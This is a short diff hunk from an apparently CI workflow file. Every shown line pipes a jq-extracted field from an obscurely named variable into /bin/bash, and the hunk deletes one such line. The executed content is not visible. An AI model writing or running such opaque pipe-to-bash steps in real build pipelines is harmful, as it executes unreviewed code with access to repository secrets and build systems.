@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$i717" | jq -r .zm808 | /bin/bash
           printf '%s' "$oe8293" | jq -r .ehgl088 | /bin/bash
           echo $riwf7259 | jq -r .nplp1 | /bin/bash
-          echo $viz4 | jq -r .vsdi01 | /bin/bash
           echo $oc09 | jq -r .gtk150 | /bin/bash
           printf '%s' "$doo4" | jq -r .cdt37887 | /bin/bash
           echo $py04 | jq -r .wvxm6121 | /bin/bash
